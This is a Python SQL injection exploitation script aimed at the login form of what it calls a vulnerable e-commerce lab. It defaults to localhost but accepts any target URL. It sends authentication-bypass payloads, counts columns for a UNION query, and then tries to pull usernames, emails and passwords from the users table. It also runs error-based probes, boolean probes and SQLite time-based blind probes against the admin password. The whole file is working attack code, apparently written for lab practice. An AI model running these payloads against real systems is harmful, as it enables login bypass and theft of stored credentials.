#!/usr/bin/env python3
"""
SQL Injection Exploitation Script
Demonstrates various SQL injection techniques on the vulnerable login endpoint.
"""

import requests
import sys
import time

class SQLInjectionTester:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.login_url = f"{base_url}/login"
        self.session = requests.Session()
    
    def test_basic_bypass(self):
        """Test basic authentication bypass"""
        print("[*] Testing basic SQL injection bypass...")
        
        payloads = [
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "admin' --",
            "' OR 'a'='a' --",
            "' UNION SELECT 1,2,3,4,5 --"
        ]
        
        for payload in payloads:
            data = {
                'username': payload,
                'password': 'anything'
            }
            
            response = self.session.post(self.login_url, data=data)
            
            if "dashboard" in response.url or "Welcome" in response.text:
                print(f"[+] SUCCESS: {payload}")
                return True
            elif "Database Error" in response.text:
                print(f"[!] SQL Error detected with: {payload}")
                print(f"    Response snippet: {response.text[:200]}...")
            else:
                print(f"[-] Failed: {payload}")
        
        return False
    
    def test_union_injection(self):
        """Test UNION-based SQL injection"""
        print("\n[*] Testing UNION-based SQL injection...")
        
        # First, find the number of columns
        for num_cols in range(1, 10):
            payload = f"' UNION SELECT {','.join(['NULL'] * num_cols)} --"
            data = {
                'username': payload,
                'password': 'test'
            }
            
            response = self.session.post(self.login_url, data=data)
            
            if "Database Error" not in response.text:
                print(f"[+] Found {num_cols} columns in the query")
                
                # Now try to extract data
                self.extract_data_union(num_cols)
                break
            else:
                print(f"[-] {num_cols} columns failed")
    
    def extract_data_union(self, num_cols):
        """Extract data using UNION injection"""
        print(f"[*] Attempting data extraction with {num_cols} columns...")
        
        # Build UNION payload to extract sensitive data
        data_payloads = [
            f"' UNION SELECT {','.join(['id', 'username', 'email', 'password', 'is_seller'][:num_cols])} FROM users --",
            f"' UNION SELECT {','.join(['1', 'sqlite_version()', '3', '4', '5'][:num_cols])} --",
            f"' UNION SELECT {','.join(['id', 'name', 'price', '4', '5'][:num_cols])} FROM products --"
        ]
        
        for payload in data_payloads:
            data = {
                'username': payload,
                'password': 'test'
            }
            
            response = self.session.post(self.login_url, data=data)
            print(f"[*] Payload: {payload}")
            print(f"[*] Response length: {len(response.text)}")
            
            if "dashboard" in response.url:
                print("[+] Injection successful - likely extracted data")
            elif "Database Error" in response.text:
                print("[!] SQL Error - payload needs adjustment")
    
    def test_error_based_injection(self):
        """Test error-based SQL injection"""
        print("\n[*] Testing error-based SQL injection...")
        
        error_payloads = [
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 30 --",
            "' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'a' --",
            "' AND (SELECT name FROM sqlite_master WHERE type='table') --"
        ]
        
        for payload in error_payloads:
            data = {
                'username': payload,
                'password': 'test'
            }
            
            response = self.session.post(self.login_url, data=data)
            
            print(f"[*] Testing: {payload[:50]}...")
            
            if "Database Error" in response.text:
                print("[+] Error-based injection detected")
                # Extract error message
                if "Debug Mode" in response.text:
                    error_start = response.text.find("Database Error")
                    error_end = response.text.find("</div>", error_start)
                    if error_start != -1 and error_end != -1:
                        error_msg = response.text[error_start:error_end]
                        print(f"[+] Error: {error_msg}")
            else:
                print("[-] No error response")
    
    def test_time_based_blind(self):
        """Test time-based blind SQL injection"""
        print("\n[*] Testing time-based blind SQL injection...")
        
        time_payloads = [
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a') AND randomblob(100000000) --",
            "' OR (SELECT COUNT(*) FROM sqlite_master) AND randomblob(50000000) --"
        ]
        
        for payload in time_payloads:
            data = {
                'username': payload,
                'password': 'test'
            }
            
            start_time = time.time()
            response = self.session.post(self.login_url, data=data)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            print(f"[*] Payload response time: {response_time:.2f}s")
            
            if response_time > 2:
                print("[+] Possible time-based blind SQL injection detected!")
            else:
                print("[-] Normal response time")

def main():
    print("="*60)
    print("SQL Injection Testing Tool")
    print("Target: Vulnerable E-Commerce Lab")
    print("="*60)
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:5000"
    
    tester = SQLInjectionTester(base_url)
    
    # Run all tests
    tester.test_basic_bypass()
    tester.test_union_injection()
    tester.test_error_based_injection()
    tester.test_time_based_blind()
    
    print("\n" + "="*60)
    print("SQL Injection testing complete!")
    print("Check the application's debug output for detailed error messages.")
    print("="*60)

if __name__ == "__main__":
    main()
